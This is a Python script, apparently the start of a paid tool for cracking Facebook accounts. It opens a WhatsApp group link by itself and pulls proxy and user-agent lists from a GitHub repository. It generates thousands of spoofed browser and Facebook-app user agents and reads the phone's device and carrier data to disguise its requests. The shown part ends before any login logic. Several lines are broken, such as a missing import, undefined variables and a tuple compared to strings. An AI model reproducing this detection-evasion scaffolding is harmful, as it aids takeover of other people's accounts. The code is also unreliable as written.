#----------------[SaLar-Script-Menu]---------------------------
#facebook : Bilal Ahmed
#update by : SaLar KhAnOo
#Script Owner : Mr SaLar
#whatsapp : ±93707266012
#----------------------------------------------------------------------------
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python salar.py')
#----------[salar whatsap group box]----------#
print('[•] Join Whatsap Group')
os.system('xdg-open https://chat.whatsapp.com/Lk71RwA3sny9m63fIElBKV?mode=ac_t')
#----------[salar approval getkey]----------#
def getKey():

    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    bxd = ""
    bumper = bxd+id+xp
    return bumper
#------------------[salar proxies menu]-------------------#
try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\033[1;37m[•] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()

#------------------[salar android models menu]-------------------#
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass
#------------------[salar user agent menu]-------------------#
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
#------------------[salar user random choice ugen menu]-------------------#
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#------------------[salar sim menu]-------------------#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}      
#------------------[salar file 1 method user agent]-------------------#
def ua1():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"
    ua = a+b+c+d
    return ua
#------------------[salar file 2 method user agent]-------------------#
def ua2():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua
#------------------[salar file 3 method user agent]-------------------#
def ua3():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua
#------------------[ salar random 1 method user agent ]-------------------#
def u4s():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom','Zong','null','Marshmallow','Telekom China','Awcc','Mtn','Salaam','Etisalat','Roshan'])
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	b = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
	c = "Dalvik/2.1.0 (Linux; U; Android 12; SM-A536B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/525.0.0.53.51;FBBV/464014627;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/AWCC;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A536B;FBSV/12;FBCA/arm64-v8a;]"
	d = "Dalvik/2.1.0 (Linux; U; Android 12; SM-A536B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/523.0.0.39.61;FBBV/463614981;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Roshan;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A536B;FBSV/12;FBCA/arm64-v8a;]"
	e = "Dalvik/2.1.0 (Linux; U; Android 13; RMX3366 Build/TKQ1.221105.002) [FBAN/FB4A;FBAV/521.0.0.42.97;FBBV/463220692;FBDM/{density=3.0,width=1080,height=2412};FBLC/en_US;FBCR/Etisalat;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3366;FBSV/13;FBCA/arm64-v8a;]"
	f = "Dalvik/2.1.0 (Linux; U; Android 11; V2031 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/520.0.0.44.99;FBBV/463024397;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/Salaam;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/V2031;FBSV/11;FBCA/arm64-v8a;]"
	g = "Dalvik/2.1.0 (Linux; U; Android 12; M2007J20CG Build/SP1A.210812.016) [FBAN/FB4A;FBAV/519.0.0.44.92;FBBV/462823607;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBCR/Mtn;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/12;FBCA/arm64-v8a;]"	
	h = "Dalvik/2.1.0 (Linux; U; Android 10; SM-A715F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/518.0.0.66.86;FBBV/462627135;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/10;FBCA/arm64-v8a;]"	
	i = "Dalvik/2.1.0 (Linux; U; Android 13; IN2013 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/518.0.0.63.86;FBBV/462626389;FBDM/{density=3.5,width=1080,height=2408};FBLC/en_US;FBCR/Marshmallow;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2013;FBSV/13;FBCA/arm64-v8a;]"
	j = "Dalvik/2.1.0 (Linux; U; Android 12; M2101K9AG Build/SP1A.210812.016) [FBAN/FB4A;FBAV/517.0.0.70.92;FBBV/462428432;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Etisalat;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9AG;FBSV/12;FBCA/arm64-v8a;]"
	k = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3361 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/515.1.0.62.90;FBBV/462026704;FBDM/{density=2.75,width=1080,height=2408};FBLC/en_US;FBCR/Roshan;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3361;FBSV/11;FBCA/arm64-v8a;]"
	l = "Dalvik/2.1.0 (Linux; U; Android 12; SM-M127F Build/SP1A.210812.016) [FBAN/FB4A;FBAV/514.0.0.65.72;FBBV/461824802;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBCR/Roshan;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-M127F;FBSV/12;FBCA/arm64-v8a;]"
	m = "Dalvik/2.1.0 (Linux; U; Android 10; RMX2001 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/513.1.0.66.92;FBBV/461627716;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/AWCC;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX2001;FBSV/10;FBCA/arm64-v8a;]"
	n = "Dalvik/2.1.0 (Linux; U; Android 12; SM-A326B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/511.0.0.73.36;FBBV/461216351;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Roshan;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A326B;FBSV/12;FBCA/arm64-v8a;]"
	o = "Dalvik/2.1.0 (Linux; U; Android 11; M2011K2C Build/RP1A.200720.012) [FBAN/FB4A;FBAV/510.0.0.72.41;FBBV/461015916;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/Etisalat;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2011K2C;FBSV/11;FBCA/arm64-v8a;]"
	p = "Dalvik/2.1.0 (Linux; U; Android 12; V2131 Build/SP1A.210812.016) [FBAN/FB4A;FBAV/472.0.0.0.49;FBBV/453403994;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBCR/AWCC;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/V2131;FBSV/12;FBCA/arm64-v8a;]"
	q = "Dalvik/2.1.0 (Linux; U; Android 13; IN2025 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/472.0.0.45.79;FBBV/453410037;FBDM/{density=3.5,width=1080,height=2412};FBLC/en_US;FBCR/Mtn;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2025;FBSV/13;FBCA/arm64-v8a;]"
	r = "Dalvik/2.1.0 (Linux; U; Android 12; SM-M325F Build/SP1A.210812.016) [FBAN/FB4A;FBAV/474.0.0.0.48;FBBV/453802389;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBCR/AWCC;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-M325F;FBSV/12;FBCA/arm64-v8a;]"
	s = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3191 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/474.0.0.44.74;FBBV/453810718;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/Mtn;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3191;FBSV/11;FBCA/arm64-v8a;]"
	t = "Dalvik/2.1.0 (Linux; U; Android 12; SM-A736B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/474.0.0.52.74;FBBV/453811755;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Etisalat;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A736B;FBSV/12;FBCA/arm64-v8a;]"
	u = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3363 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/475.0.0.40.82;FBBV/454014379;FBDM/{density=2.75,width=1080,height=2412};FBLC/en_US;FBCR/AWCC;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3363;FBSV/11;FBCA/arm64-v8a;]"
	v = "Dalvik/2.1.0 (Linux; U; Android 12; M2102K1AG Build/SP1A.210812.016) [FBAN/FB4A;FBAV/476.0.0.49.74;FBBV/454214857;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Etisalat;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1AG;FBSV/12;FBCA/arm64-v8a;]"
	w = "Dalvik/2.1.0 (Linux; U; Android 10; RMX2007 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/477.0.0.56.80;FBBV/454415688;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/AWCC;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX2007;FBSV/10;FBCA/arm64-v8a;]"
	x = "Dalvik/2.1.0 (Linux; U; Android 12; SM-A536F Build/SP1A.210812.016) [FBAN/FB4A;FBAV/478.0.0.41.86;FBBV/454614319;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Salaam;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A536F;FBSV/12;FBCA/arm64-v8a;]"
	y = "Dalvik/2.1.0 (Linux; U; Android 11; M2012K11AG Build/RP1A.200720.012) [FBAN/FB4A;FBAV/480.0.0.0.51;FBBV/455005459;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/AWCC;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/11;FBCA/arm64-v8a;]"
	z = "Dalvik/2.1.0 (Linux; U; Android 12; SM-A326F Build/SP1A.210812.016) [FBAN/FB4A;FBAV/480.0.0.55.88;FBBV/455016452;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBCR/Etisalat;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A326F;FBSV/12;FBCA/arm64-v8a;]"
	ua = a + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + w + x + y + z	
	return ua 
#------------------[salar command logo menu]-------------------#
logo=("""\033[1;91m
  \033[1;91m ######     ###    ##          ###    ########  
  \033[1;91m##    ##   ## ##   ##         ## ##   ##     ## 
  \033[1;97m##        ##   ##  ##        ##   ##  ##     ## 
  \033[1;97m ######  ##     ## ##       ##     ## ########  
  \033[1;97m      ## ######### ##       ######### ##   ##   
  \033[1;91m##    ## ##     ## ##       ##     ## ##    ##  
  \033[1;91m ######  ##     ## ######## ##     ## ##     ## 
\033[1;37m======================================================
\033[1;37m[•] 𝐀𝐔𝐓𝐇𝐎𝐑   : 𝐒𝐀𝐋𝐀𝐑 𝐊𝐇𝐀𝐍𝐎𝐎
\033[1;37m[•] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : 𝐁𝐈𝐋𝐀𝐋 𝐀𝐇𝐌𝐄𝐃
\033[1;37m[•] 𝐓𝐎𝐎𝐋𝐒    : \033[1;32m𝐏𝐀𝐈𝐃
\033[1;37m[•] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍  :\033[91;1m 1.0.9
\033[1;37m======================================================
\033[1;37m[•]        \033[1;41m\033[1;37m[𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 \033[1;42m\033[1;37m𝐒𝐀𝐋𝐀𝐑 𝐓𝐎𝐎𝐋𝐒]\x1b[0m
\033[1;37m======================================================""")
def linex():
